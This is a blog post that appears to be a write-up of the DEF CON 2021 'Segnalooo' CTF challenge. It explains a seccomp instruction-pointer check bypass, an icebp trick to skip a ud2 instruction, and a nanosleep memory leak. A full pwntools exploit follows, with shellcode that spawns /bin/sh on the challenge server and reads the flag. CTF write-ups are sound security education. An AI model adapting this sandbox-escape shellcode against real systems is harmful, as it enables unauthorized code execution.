<!doctype html>
<html lang="en"><head>
    <title>Defcon-2021-Segnalooo</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="/css/theme.min.css">

    
    
    

    
</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="/" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="/images/zzlol.jpg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
            <h2 class="m-0 mb-2 mt-4">
                <a href="/" class="text-decoration-none">
                    
                        mhibio
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    Pwn For Fun
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="post/" title="">Posts</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="about/whoami" title="">About</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="" target="_blank">
                            <i class=" text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="" target="_blank">
                            <i class=" text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="" target="_blank">
                            <i class=" text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-2">
        <div class="mb-3">
            <h3 class="mb-0">Defcon-2021-Segnalooo</h3>
            
            <small class="text-muted">Published May 6, 2021</small>
        </div>

        <article>
            <p>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</p>
<hr>
<h3 id="binary">Binary</h3>
<ol start="0">
<li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
<li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )</li>
<li>Munmap all Memory except addr1, addr2</li>
<li>Call Signal Handler with <code>int3</code></li>
<li>After Signal Handler, <code>IP</code> returns to our Shellcode.<br>
=&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
</ol>
<hr>
<h3 id="seccomp-filter">Seccomp Filter</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x08</span> <span class="mh">0x00</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000023</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0006</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000008</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">instruction_pointer</span>
 <span class="mo">0007</span><span class="p">:</span> <span class="mh">0x25</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x80000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">000</span><span class="mi">9</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x01</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span> <span class="k">else</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
 <span class="mo">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0012</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
<p><strong>But, all Memory is bigger than 0x80000000.</strong><br>
<strong>All Syscall gadgets fail to bypass ip check.</strong><br>
<strong>How can I bypass <code>IP check</code>?</strong></p>
<blockquote>
<p><strong>One interesting thing is that Seccomp only do 4 bytes of ip check.</strong></p>
</blockquote>
<p>So we can bypass <strong>Ip check</strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
( 4 bytes of addr2 <code>0x10XXXXXXXXXX</code> are always smaller than <code>0x80000000</code>. ).</p>
<hr>
<h3 id="ud2-instruction">ud2 instruction</h3>
<p><code>ud2 instruction</code> means undefined instruction.<br>
when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
-&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )<br>
But, I can execute only 1 instruction.<br>
<strong>if I execute <code>icebp</code>, I can escape <code>ud2</code> instruction.</strong></p>
<hr>
<h3 id="leak-memory">leak memory</h3>
<p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
<p>so we can leak memory <code>0x10XXXXXXXXXX</code><br>
then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
<hr>
<h3 id="exploit">Exploit</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>

<span class="k">def</span> <span class="nf">pack64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>  <span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>

<span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">inc edi
</span><span class="s1">shl rdi, 44
</span><span class="s1">mov rsi, rsp
</span><span class="s1">
</span><span class="s1">add rdi, 0x1000
</span><span class="s1">xor rax, rax
</span><span class="s1">mov al, 35
</span><span class="s1">syscall
</span><span class="s1">
</span><span class="s1">cmp al, 0xea
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">sc2</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">lea rbx, [rdi+0xb4]
</span><span class="s1">lea rsi, [rsp+0x30]
</span><span class="s1">xor rdi, rdi
</span><span class="s1">xor eax, eax
</span><span class="s1">mov ax, 322
</span><span class="s1">jmp rbx
</span><span class="s1">nop
</span><span class="s1">
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s2">&#34;f1&#34;</span><span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;7405e9e6ffffff&#34;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;41&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">pack64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;90&#34;</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;2f62696e2f7368&#34;</span> <span class="c1">#binsh</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1">#p = process(&#39;./stub&#39;)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;segnalooo.challenges.ooo&#34;</span><span class="p">,</span> <span class="mi">4321</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Give me some code!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;while read line;do echo </span><span class="se">\&#34;</span><span class="s2">$line</span><span class="se">\&#34;</span><span class="s2">;done &lt; /flag&#34;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
</code></pre></div><hr>
<h4 id="flag--ooos3riouslywh4tissigaltstack">Flag : <code>OOO{s3riously,wh4tISsigaltstack???}</code></h4>

        </article>
    </div>

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
